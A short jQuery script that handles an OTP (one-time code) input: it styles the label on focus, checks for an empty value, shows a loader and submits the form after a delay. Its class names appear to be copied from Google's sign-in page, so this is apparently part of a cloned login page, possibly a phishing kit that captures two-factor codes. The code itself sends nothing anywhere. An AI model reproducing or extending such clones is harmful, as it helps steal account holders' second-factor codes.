$(document).ready(function() {
    $('#otp').on('focusin', function() {
        const inputField = $(this);

        $('#userLabel').addClass('u3bW4e');
        if (inputField.val() === '') {
            $('#userLabel').addClass('CDELXb');
        }
    });

    $('#otp').on('focusout', function() {
        $('#userLabel').removeClass('u3bW4e');
        if ($(this).val() === '') {
            $('#userLabel').removeClass('CDELXb').removeClass('u3bW4e');
        }
    });

    $('#nextTo').on('click', function() {
        $('form').submit();
    });

    $('form').on('submit', function(event) {
        event.preventDefault();

        var otp = $('#otp').val();

        if (otp.length == 0) {
            $('#errorUsername').removeClass('hidden');
            $('#userLabel').addClass('IYewr');
        } else {
            $('#errorUsername').addClass('hidden');
            $('#userLabel').addClass('CDELXb').removeClass('IYewr');
            $('.kPY6ve').removeClass('hidden');
            $('#loader-login').removeClass('jK7moc').removeClass('qdulke');
            setTimeout(() => {
                this.submit();
            }, 1000);
        }
    });

});